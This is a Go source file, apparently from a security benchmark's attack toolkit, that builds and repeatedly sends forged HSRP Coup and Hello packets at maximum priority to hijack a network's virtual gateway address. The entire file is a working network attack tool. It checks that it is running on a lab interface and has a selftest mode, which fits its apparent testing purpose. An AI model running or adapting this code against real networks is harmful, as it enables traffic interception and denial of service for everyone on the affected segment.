package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

func buildHSRP(group int, virtualIP string, priority, opcode int, iface string) ([]byte, error) {
	if group < 0 || group > 255 {
		return nil, fmt.Errorf("invalid HSRP group %d", group)
	}
	if priority < 0 || priority > 255 {
		return nil, fmt.Errorf("invalid HSRP priority %d", priority)
	}
	if opcode < 0 || opcode > 255 {
		return nil, fmt.Errorf("invalid HSRP opcode %d", opcode)
	}
	vip := net.ParseIP(virtualIP).To4()
	if vip == nil {
		return nil, fmt.Errorf("invalid HSRP virtual IP %q", virtualIP)
	}

	vmac := net.HardwareAddr{0x00, 0x00, 0x0c, 0x07, 0xac, byte(group & 0xff)}
	dstMAC := net.HardwareAddr{0x01, 0x00, 0x5e, 0x00, 0x00, 0x02}
	dstIP := net.IPv4(224, 0, 0, 2)
	// Deliberate determinism improvement: Python lets Scapy route-resolve IP.src; pin it to eth1's IPv4.
	srcIP := attackcommon.InterfaceIPv4(iface)

	hsrp := make([]byte, 20)
	hsrp[1] = byte(opcode)
	hsrp[2] = 16
	hsrp[3] = 3
	hsrp[4] = 10
	hsrp[5] = byte(priority)
	hsrp[6] = byte(group)
	copy(hsrp[8:16], []byte("cisco\x00\x00\x00"))
	copy(hsrp[16:20], vip)

	udp := attackcommon.BuildUDP(srcIP, dstIP, 1985, 1985, hsrp, false)
	ip := attackcommon.BuildIPv4(srcIP, dstIP, 17, udp)
	frame := make([]byte, 14, 14+len(ip))
	copy(frame[0:6], dstMAC)
	copy(frame[6:12], vmac)
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)
	return append(frame, ip...), nil
}

func run() int {
	fs, common := attackcommon.BaseParser("HSRP hijack: forge a higher-priority Coup/Hello")
	group := fs.Int("group", 1, "")
	virtualIP := fs.String("virtual_ip", "192.168.1.1", "")
	priority := fs.Int("priority", 255, "")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	frame, err := buildHSRP(*group, *virtualIP, *priority, 1, common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", fmt.Sprintf("HSRP packet build failed: %v", err))
		return 1
	}
	if common.Selftest {
		attackcommon.SelftestOK("hsrp_hijack", fmt.Sprintf("HSRP Coup len=%d", len(frame)))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		opcode := 1
		if n != 0 {
			opcode = 0
		}
		frame, err := buildHSRP(*group, *virtualIP, *priority, opcode, common.Iface)
		if err != nil {
			return err
		}
		if err := sender.Send(frame); err != nil {
			return fmt.Errorf("send HSRP frame: %w", err)
		}
		kind := "Hello"
		if opcode == 1 {
			kind = "Coup"
		}
		attackcommon.Status("SENT", fmt.Sprintf("%s #%d group=%d vip=%s priority=%d", kind, n+1, *group, *virtualIP, *priority))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
